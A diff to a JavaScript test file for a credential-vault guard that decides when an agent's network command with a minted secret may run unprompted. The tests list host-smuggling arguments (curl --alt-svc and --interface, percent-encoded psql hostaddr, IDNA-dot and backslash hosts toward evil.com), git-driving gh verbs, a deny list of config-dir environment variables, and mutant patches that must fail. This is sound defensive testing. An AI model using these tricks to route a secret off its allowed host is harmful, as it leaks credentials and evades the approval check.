@@ -488,11 +488,56 @@ function ownRoad(Vm) {
   say('sameHost: a known tool\'s wildcard', Vm.sameHost('*.amazonaws.com', 's3.amazonaws.com'), true);
   say('sameHost: not a lookalike', Vm.sameHost('evilapi.example.com', 'api.example.com'), false);
   say('sameHost: not a parent', Vm.sameHost('example.com', 'api.example.com'), false);
+  // ROUND 3 (the parser review, with REAL tools): a minted value --for good.com must never run with NO card where the real
+  // command sends it off good.com — four residuals pre-existing on the base, plus three table gaps (m1 / m2 / m3)
+  const R3 = (argv, env = []) => Vm.planOf({ argv, env: [['T0', OWN], ...env] });
+  for (const [name, p, want, fh] of [
+    // fixup 1 — curl: a flag that REDIRECTS the connection (--alt-svc / --interface) or a value that is an agent-writable FILE
+    // (cert / ca / hsts) is blind; the real curl honours an agent's alt-svc cache and sends the whole request elsewhere
+    ['curl --alt-svc ./cache https://good.com/ (an alt-svc cache redirects)', R3(['curl', '--alt-svc', './cache', 'https://good.com/']), 'ask:once,always,deny:another-host @?', 'good.com'],
+    ['curl --cacert ./ca.pem https://good.com/ (an agent CA)', R3(['curl', '--cacert', './ca.pem', 'https://good.com/']), 'ask:once,deny:another-host @?', 'good.com'],
+    ['curl --hsts ./h https://good.com/ (an agent HSTS cache)', R3(['curl', '--hsts', './h', 'https://good.com/']), 'ask:once,deny:another-host @?', 'good.com'],
+    ['curl --interface evil https://good.com/ (binds the egress)', R3(['curl', '--interface', 'evil', 'https://good.com/']), 'ask:once,always,deny:another-host @?', 'good.com'],
+    ['curl -o out.json https://good.com/ (an OUTPUT file, not a config) => allowed', R3(['curl', '-o', 'out.json', 'https://good.com/']), 'ok:own', 'good.com'],
+    // fixup 2 — libpq percent-decodes a conninfo URI's query KEYWORDS (?%68ostaddr= => hostaddr=) ⇒ a % in the query is blind
+    ['psql ...?%68ostaddr=10.0.0.5 (a decoded hostaddr)', R3(['psql', 'postgresql://good.com/app?%68ostaddr=10.0.0.5']), 'ask:once,deny:another-host @?', 'good.com'],
+    ['psql ...?%68ost=evil (a decoded host)', R3(['psql', 'postgresql://good.com/app?%68ost=evil.com']), 'ask:once,deny:another-host @?', 'good.com'],
+    ['psql ...?hostaddr=10.0.0.5 (plain: the real host is read)', R3(['psql', 'postgresql://good.com/app?hostaddr=10.0.0.5']), 'ask:once,deny:another-host @10.0.0.5', 'good.com'],
+    ['psql postgresql://good.com/a%20b (percent in the PATH) => allowed', R3(['psql', 'postgresql://good.com/a%20b']), 'ok:own', 'good.com'],
+    // fixup 3 — a network tool's positional that is not a readable target is UNREAD (blind), never silently ignored
+    ['curl https://good.com/ good.com。evil.com (IDNA dot)', R3(['curl', 'https://good.com/', 'good.com。evil.com']), 'ask:once,deny:another-host @?', 'good.com'],
+    ['curl https://good.com/ good.com%2eevil.com (percent)', R3(['curl', 'https://good.com/', 'good.com%2eevil.com']), 'ask:once,deny:another-host @?', 'good.com'],
+    ['curl https://good.com/ good.com\\@evil.com (backslash userinfo)', R3(['curl', 'https://good.com/', 'good.com\\@evil.com']), 'ask:once,deny:another-host @?', 'good.com'],
+    ['wget https://good.com/ good.com。evil.com (the wget twin)', R3(['wget', 'https://good.com/', 'good.com。evil.com']), 'ask:once,deny:another-host @?', 'good.com'],
+    ['curl https://good.com/ evil.com (a real host is still read)', R3(['curl', 'https://good.com/', 'evil.com']), 'ask:once,deny:another-host @evil.com', 'good.com'],
+    // fixup 4 — gh verbs that drive git with the value in env (a flag makes the verb touch the working tree / run hooks)
+    ['gh pr merge --delete-branch (a local+remote git checkout)', R3(['gh', 'pr', 'merge', '--delete-branch']), 'ask:once,deny:another-host @?', 'github.com'],
+    ['gh repo create --push (the project pre-push hook)', R3(['gh', 'repo', 'create', '--push']), 'ask:once,deny:another-host @?', 'github.com'],
+    ['gh repo create --clone (clones)', R3(['gh', 'repo', 'create', '--clone']), 'ask:once,deny:another-host @?', 'github.com'],
+    ['gh extension install owner/x (runs code)', R3(['gh', 'extension', 'install', 'owner/x']), 'ask:once,deny:another-host @?', 'github.com'],
+    ['gh pr merge (no git-driving flag) => allowed', R3(['gh', 'pr', 'merge']), 'ok:own', 'github.com'],
+    // fixup 5 — gh api <path> is a path under the default host; only a repo-spec verb reads a positional HOST/OWNER/REPO
+    ['gh api repos/cli/cli (a path, not a host) => allowed', R3(['gh', 'api', 'repos/cli/cli']), 'ok:own', 'github.com'],
+    ['gh release upload v1 ./dist/a/b (a local file, not a host) => allowed', R3(['gh', 'release', 'upload', 'v1', './dist/a/b']), 'ok:own', 'github.com'],
+    ['gh repo view github.com/o/r (a repo spec is read) => allowed', R3(['gh', 'repo', 'view', 'github.com/o/r']), 'ok:own', 'github.com'],
+    ['gh repo view evil.com/o/r (off the for-host) => asks', R3(['gh', 'repo', 'view', 'evil.com/o/r']), 'ask:once,deny:another-host @evil.com', 'github.com'],
+    ['gh repo clone evil.com/o/r (drives git ⇒ blind) => asks', R3(['gh', 'repo', 'clone', 'evil.com/o/r']), 'ask:once,deny:another-host @?', 'github.com'],
+    // m1 — httpie --raw takes a body; without it the body shadows the real (scheme-less) URL
+    ['http --raw https://good.com/ evil.example.com (--raw body, the URL is read)', R3(['http', '--raw', 'https://good.com/', 'evil.example.com']), 'ask:once,deny:another-host @evil.example.com', 'good.com'],
+    ['http --raw body https://good.com/ => allowed', R3(['http', '--raw', 'body', 'https://good.com/']), 'ok:own', 'good.com'],
+    // m2 — wget --input-metalink fetches every URL in its file (like -i), so it is a config/input flag ⇒ blind
+    ['wget --input-metalink=f.meta http://good.com/ (a file of URLs)', R3(['wget', '--input-metalink=f.meta', 'http://good.com/']), 'ask:once,deny:another-host @?', 'good.com'],
+  ]) say(`own minted · ${name}`, r2(p, fh), want);
+  // fixup 1 — a cert flag whose value IS the vault's own file is not a config (blind stays false)
+  say('own minted · curl --cert $VAULT_FILE{...} (the vault file itself) => not blind', Vm.shapeOf(Vm.planOf({ argv: ['curl', '--cert', '$VAULT_FILE{mounts/m1/secretKey}', 'https://good.com/'], env: [['T0', OWN]] })).blind, false);
+  // m3 — a config-DIR env the agent can write (its --proxy / --verify / a default host) is refused by name, like CURL_HOME / WGETRC
+  const envCode = (n) => { const q = Vm.planOf({ argv: ['curl', 'https://good.com/'], env: [['T0', OWN], [n, './x']] }); return q.ok ? 'ok' : q.code; };
+  for (const n of ['HTTPIE_CONFIG_DIR', 'GH_CONFIG_DIR', 'MYSQL_HOME', 'PGSYSCONFDIR']) say(`m3: ${n} refused by name`, envCode(n), 'env_refused');
   return bad;
 }
 {
   const bad = ownRoad(V);
-  ok(!bad.length, 'the own road: whose (registered / durable id, a pending fork borrows nothing), own stored ⇒ ok:own everywhere (no card), own minted ⇒ ok:own to its host / under it and ONCE per host elsewhere (both hosts on the card; a pass per entry × host); where the destination cannot be told (a shell, an interpreter, a config file, a routing flag, project code, an unknown or agent-writable program, round 2: a known tool naming no host it can read; a backslash hides no host) ONCE per command shape locally and EVERY run on a cluster (a live «always» passes it); round 2: a host written without a scheme, in host=, attached, in a URI\'s list, gh --hostname is read, the owner\'s entry and a mix ⇒ today\'s road («always» / seen never pass a host), the lock / argv / the floor first', bad);
+  ok(!bad.length, 'the own road: whose (registered / durable id, a pending fork borrows nothing), own stored ⇒ ok:own everywhere (no card), own minted ⇒ ok:own to its host / under it and ONCE per host elsewhere (both hosts on the card; a pass per entry × host); where the destination cannot be told (a shell, an interpreter, a config file, a routing flag, project code, an unknown or agent-writable program, round 2: a known tool naming no host it can read; a backslash hides no host) ONCE per command shape locally and EVERY run on a cluster (a live «always» passes it); round 2: a host written without a scheme, in host=, attached, in a URI\'s list, gh --hostname is read, the owner\'s entry and a mix ⇒ today\'s road («always» / seen never pass a host), the lock / argv / the floor first; round 3: a curl connection/config-file flag (--alt-svc / --cacert / --hsts / --interface), a conninfo URI\'s percent-decoded query, a network positional that is not a readable target, a gh verb that drives git (pr merge --delete-branch / repo create --push|--clone / extension install), gh api <path> read as a path not a host, httpie --raw as a body (m1), wget --input-metalink as a config (m2), a config-dir env refused (m3)', bad);
 }
 
 console.log('⑥ THE SCRUBBER — a value and its forms (FORMS: spelled and read), over ONE window per run');
@@ -751,6 +796,15 @@ console.log('⑧ MUTANTS — patched copies of src/vault-run.js must go RED');
     ['an attached short flag is not split (round 2)', "cl = a[1] !== '-' && a.length > 2 && !takes.includes(a) ? shortSplit(a, takes) : null;", 'cl = null;', ownRoad],
     ['a URI\'s host list is not read (round 2)', "for (const x of (m[4] || '').split(',').slice(1))", 'for (const x of [])', ownRoad],
     ['a client\'s shell escape is not seen (round 2)', 'if (row.scriptFlags) for (const v of vals(row.scriptFlags))', 'if (false) for (const v of vals(row.scriptFlags))', ownRoad],
+    // round 3 (the brief's RED copies): each residual re-opened on a base-source copy ⇒ the own-road rows RED
+    ['a cert / config file flag is not a config (round 3)', 'if (row.fileFlags) for (const [f, v] of valued) if (row.fileFlags.includes(f) &&', 'if (row.fileFlags) for (const [f, v] of valued) if (false &&', ownRoad],
+    ['a conninfo URI percent query is not read (round 3)', 'if (conninfoUriBlind(a)) unread = true;', 'if (conninfoUriBlind(a) && false) unread = true;', ownRoad],
+    ['a network positional that is not a target is ignored (round 3)', 'return strict ? { unread: true } : {};', 'return {};', ownRoad],
+    ['a verb+flag that drives git is not blind (round 3)', 'if (row.blindFlagSubs) for (const b of row.blindFlagSubs)', 'if (false) for (const b of row.blindFlagSubs)', ownRoad],
+    ['gh reads every positional as a repo host (round 3)', 'positionals.length ? [positionals[0]] : [];', 'positionals.length ? positionals : positionals;', ownRoad],
+    ['httpie --raw read as a target (round 3, m1)', "'--verify', '--proxy', '--raw'];", "'--verify', '--proxy'];", ownRoad],
+    ['wget --input-metalink is not a config (round 3, m2)', "'-i', '--input-file', '--input-metalink'],", "'-i', '--input-file'],", ownRoad],
+    ['a config-dir env is not refused (round 3, m3)', 'PGSYSCONFDIR|PSQLRC|RCLONE_CONFIG|HTTPIE_CONFIG_DIR|GH_CONFIG_DIR|MYSQL_HOME|NETRC', 'PSQLRC|RCLONE_CONFIG|NETRC', ownRoad],
   ];
   for (const [name, from, to, leg] of LEGS) {
     const { hit, M } = mutant(name.replace(/\W+/g, '-'), from, to);
